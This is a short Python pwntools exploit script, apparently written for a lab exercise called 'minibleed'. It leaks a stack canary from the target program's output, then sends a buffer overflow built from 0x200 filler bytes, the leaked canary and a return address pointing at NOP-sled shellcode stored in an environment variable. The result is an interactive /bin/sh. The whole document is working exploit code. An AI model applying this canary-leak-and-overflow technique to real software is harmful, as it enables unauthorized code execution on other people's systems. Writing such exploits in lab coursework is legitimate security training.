from pwn import *

context.log_level = 'debug'
context.terminal = ["tmux", "split-window", "-h"]

env = {"SHELLCODE": b"\x90" * 0x1000 + asm(shellcraft.i386.linux.sh())}
# p = gdb.debug(["./target"], env=env)
p = process(["/home/lab06/minibleed/target"], env=env)
    
addr_shellcode = 0xffffd800

p.sendline(b'524')
p.sendline()

p.recvuntil(b'> 0200: ')
result = p.recv(11)

bytes_list = [result[i:i+2] for i in range(0, len(result), 3)]
canary = [int(byte, 16) for byte in bytes_list]

    
exploit = b'A' * 0x200
for ch in canary:
    exploit += p8(ch)
exploit += b'A' * 4
exploit += p32(addr_shellcode)

p.sendline(b'524')
p.sendline(exploit)

p.interactive()